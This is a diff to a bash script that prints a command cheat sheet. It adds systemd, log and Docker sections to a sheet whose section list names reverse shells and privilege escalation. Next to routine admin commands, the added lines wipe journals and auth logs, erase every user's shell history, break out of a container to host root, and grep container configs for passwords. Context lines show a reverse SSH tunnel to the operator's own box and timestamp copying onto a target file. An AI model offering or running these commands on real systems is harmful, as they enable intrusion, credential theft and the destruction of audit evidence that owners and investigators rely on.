@@ -1,5 +1,6 @@
 #!/usr/bin/env bash
 # one-liners.sh — reference sheet, run to print, nothing executes
+# sections: users, sudoers, ssh, firewall, suid/privesc, cron, revshells, recon, network, services/systemd, logs, docker, files
 G='\033[0;32m';C='\033[0;36m';Y='\033[1;33m';B='\033[1m';D='\033[2m';NC='\033[0m'
 hdr() { echo -e "\n${C}${B}━━  $*  ━━${NC}"; }
 cmd() { printf "  ${Y}%-52s${NC} ${D}# %s${NC}\n" "$1" "$2"; }
@@ -67,6 +68,33 @@ cmd "ssh -L LPORT:RHOST:RPORT user@jumphost -N &"                        "port f
 cmd "ssh -R LPORT:localhost:22 user@yourbox -N &"                        "reverse tunnel to your box"
 cmd "ip route; ip addr"                                                   "routing + interfaces"
 cmd "cat /etc/hosts"                                                      "hosts file (find internal names)"
+
+hdr "SERVICES / SYSTEMD"
+cmd "systemctl list-units --type=service --state=running"                 "running services"
+cmd "systemctl list-timers --all"                                         "all timers (real + planted)"
+cmd "systemctl cat <service>"                                             "show unit file contents"
+cmd "systemctl enable --now <service>"                                    "enable + start in one shot"
+cmd "systemctl disable --now <service>"                                   "disable + stop in one shot"
+cmd "systemctl daemon-reload"                                             "reload after editing unit files"
+cmd "journalctl -u <service> -n 50 --no-pager"                           "last 50 log lines for a service"
+cmd "systemd-run --unit=onetime --remain-after-exit /bin/bash -c 'CMD'"  "transient oneshot unit"
+
+hdr "LOGS"
+cmd "journalctl --vacuum-time=1s"                                         "delete all archived journals"
+cmd "truncate -s 0 /var/log/syslog /var/log/auth.log"                    "zero out main logs"
+cmd "find /var/log -type f -name '*.log' -exec truncate -s 0 {} +"       "zero ALL log files"
+cmd "echo > ~/.bash_history && history -c"                                "nuke current user history"
+cmd "find / -name '.bash_history' -exec truncate -s 0 {} + 2>/dev/null"  "nuke ALL user histories"
+cmd "utmpdump /var/log/wtmp"                                              "decode login records"
+cmd "last -aiF"                                                           "full login history"
+
+hdr "DOCKER / CONTAINERS"
+cmd "docker ps -a"                                                        "all containers (running + stopped)"
+cmd "docker exec -it <cid> /bin/bash"                                     "shell into container"
+cmd "docker run -v /:/host -it alpine chroot /host"                       "host root via alpine mount"
+cmd "docker inspect <cid> | grep -i pass"                                 "grep container config for creds"
+cmd "docker logs <cid> 2>&1 | tail -50"                                   "recent container logs"
+cmd "find / -name 'docker-compose.yml' 2>/dev/null"                       "find compose files"
 
 hdr "FILES"
 cmd "touch -r /etc/passwd <target>"                                       "copy timestamps from /etc/passwd"
